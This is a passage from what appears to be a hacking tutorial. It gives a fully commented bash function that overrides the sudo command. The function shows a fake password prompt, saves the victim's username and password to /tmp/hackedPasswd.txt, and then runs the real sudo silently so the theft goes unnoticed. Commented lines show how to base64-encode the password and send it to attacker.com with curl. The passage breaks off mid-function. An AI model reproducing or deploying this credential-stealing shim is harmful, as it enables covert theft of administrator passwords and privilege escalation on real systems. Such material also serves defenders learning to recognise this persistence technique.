$ type sudo
sudo is /usr/bin/sudo
```

```bash
function sudo() {
  # A "realsudo" variable is created. It calls the `which` command to locate
  # the path to the real sudo binary. This is used later in the function to
  # execute the target's desired command.
  realsudo="$(which sudo)"

  # The `read` command will prompt (`-p`) the target with a convincing password
  # request. The `-s` argument hides the input password, just as the real
  # sudo command would. The target password is then set in the "inputPasswd"
  # variable.
  read -s -p "[sudo] password for $USER: " inputPasswd

  # There are two `printf` commands here, separated by a semicolon.
  # The first simply prints a new line in the terminal, as the real sudo
  # does. The second writes the target's username and password to a
  # file called "hackedPasswd.txt" in the /tmp directory.
  printf "\n"; printf '%s\n' "$USER : $inputPasswd" >/tmp/hackedPasswd.txt

  # As an alternative to writing the password to the /tmp directory,
  # it can be exfiltrated to the attacker's server. Uncomment the below
  # "encoded" and "curl" lines to enable this function. The password
  # is encoded with `base64` to make it easier to transmit in the URL.
  # encoded=$(printf '%s' "$inputPasswd" | base64) >/dev/null 2>&1
  # curl -s "http://attacker.com/$USER:$encoded" >/dev/null 2>&1

  # The `-S` option allows users to input their sudo password using the command
  # line. This is used to run an arbitrary `exit` command (`-c`) as the root
  # user (`-u`) to unlock the sudo timeout function. This command and its
  # output are hidden (/dev/null) from the target. It's only here to allow
  # sudo usage for future commands.
  # For more on sudo timeouts and /dev/null, see:
  # https://itsfoss.com/change-sudo-password-timeout-ubuntu/
  # https://stackoverflow.com/questions/10508843/what-is-dev-null-21
  $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1

  # With the sudo timeout engaged, privileged commands can be run without
  # prompting the user for a password. This line will execute the target's
  # desired command.
  $realsudo "${@:1}"
